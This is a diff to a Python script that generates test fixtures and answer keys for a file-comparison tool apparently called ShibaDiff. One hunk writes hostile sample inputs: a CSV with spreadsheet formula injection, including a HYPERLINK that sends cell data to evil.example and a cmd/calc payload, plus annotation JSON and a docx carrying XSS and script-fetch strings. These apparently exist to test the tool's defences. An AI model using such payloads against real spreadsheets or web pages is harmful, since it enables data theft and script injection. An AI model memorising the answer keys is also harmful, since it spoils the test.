@@ -149,7 +149,7 @@ def r06(d):
     dd[0].save(P(f'{d}/PL-3307_RevD_A1.pdf'), save_all=True, append_images=dd[1:], resolution=150)
     for n in ['_1C.png', '_2C.png', '_1D.png', '_2D.png', '_3D.png']: os.remove(P(f'{d}/{n}'))
     big_drawing(f'{d}/PL-3307-1_RevD_現場戻りスキャン.jpg', 'D', '1', [(400, 700, 1500, 500, '2400'), (2200, 700, 900, 500, '1250')], extra='※脚長さ変更 1200→1250', rot=0.5, offset=(14, -10), scan=True, fmt='JPEG')
-    key(d, 'A1（4967×3508px）。RevC 2シート→RevD 3シート。RevD の2ページ目にシート3が挿入（並びは 1,3,2）', 'シート1：寸法 1200→1250、注記を追加', 'シート2：変更なし', '現場戻りスキャン（0.5°傾き）と RevD シート1 は注記以外同じ')
+    key(d, 'A1（4967×3508px）。RevC 2シート→RevD 3シート。RevD の2ページ目にシート3が挿入（並びは 1,3,2）', 'シート1：寸法 1200→1250、注記を追加', 'シート2：変更なし', '現場戻りスキャン（0.5°傾き・ノイズあり）と RevD シート1 は同じ内容（差異なしが正解）')
 
 
 def r07(d):
@@ -277,8 +277,8 @@ def r14(d):
     text(f'{d}/普通のテキスト.txt', '通常のテキスト\n本文\n')
     text(f'{d}/取引先一覧_数式注入.csv', '会社名,電話\n株式会社A,03-0000-0000\n=HYPERLINK("http://evil.example/?"&A2,"詳細"),03-1111-1111\n@SUM(1+1)*cmd|\'/C calc\'!A0,000\n', 'utf-8')
     text(f'{d}/取引先一覧_正常.csv', '会社名,電話\n株式会社A,03-0000-0000\n株式会社B,03-1111-1111\n', 'utf-8')
-    ann = {'app': 'ShibaDiff', 'side': 0, 'name': '普通のテキスト.txt', 'rot': 0, 'ann': {'0': [{'t': 'note', 'x': 50, 'y': 50, 'text': '<img src=x onerror=alert(2)>', 'bg': 'red;background:url(http://evil.example)'},
-                                                                                         {'t': 'rect', 'x': '1);fill:url(javascript:alert(3)', 'y': 10, 'w': 10, 'h': 10, 'c': '#f00"/><script>alert(4)</script>'}]}}
+    ann = {'app': 'shibadiff', 'version': 1, 'files': [{'side': 0, 'name': '普通のテキスト.txt', 'size': len('通常のテキスト\n本文\n'.encode()), 'rot': 0, 'annotations': {'0': [{'t': 'note', 'x': 50, 'y': 50, 'text': '<img src=x onerror=alert(2)>', 'bg': 'red;background:url(http://evil.example)'},
+                                                                                         {'t': 'rect', 'x': '1);fill:url(javascript:alert(3)', 'y': 10, 'w': 10, 'h': 10, 'c': '#f00"/><script>alert(4)</script>'}]}}]}
     open(P(f'{d}/細工した注釈.json'), 'w', encoding='utf-8').write(json.dumps(ann, ensure_ascii=False))
     mkdocx(f'{d}/社外秘_事業計画.docx', '社外秘 事業計画', ['新製品のコード名は「ORCA」。', '発売は2027年10月を予定。'])
     mkdocx(f'{d}/社外秘_事業計画_改.docx', '社外秘 事業計画', ['新製品のコード名は「ORCA」。', '発売は2028年1月を予定。', '<script>fetch("http://evil.example")</script>'])
@@ -305,7 +305,7 @@ def r16(d):
     rows = [(f'S{i:02d}', 300 + (i % 3) * 25, 120 + i * 3, round(0.88 + i * 0.004, 3)) for i in range(1, 16)]
     rows2 = [list(r) for r in rows]; rows2[6][3] = 0.925; rows2[11][2] = 160
     text(f'{d}/measurements_run1.csv', hdr + ''.join(','.join(map(str, r)) + '\n' for r in rows)); text(f'{d}/measurements_run1_corrected.csv', hdr + ''.join(','.join(map(str, r)) + '\n' for r in rows2))
-    key(d, '論文：透過率 92%→94%、アニール 350 °C 2 h→300 °C 3 h、バンドギャップ 3.21 ± 0.02→3.19 ± 0.03', 'CSV：S07 transmittance 0.904→0.925、S12 thickness 153→160')
+    key(d, '論文：透過率 92%→94%、アニール 350 °C 2 h→300 °C 3 h、バンドギャップ 3.21 ± 0.02→3.19 ± 0.03', 'CSV：S07 transmittance 0.908→0.925、S12 thickness 156→160')
 
 
 def r17(d):
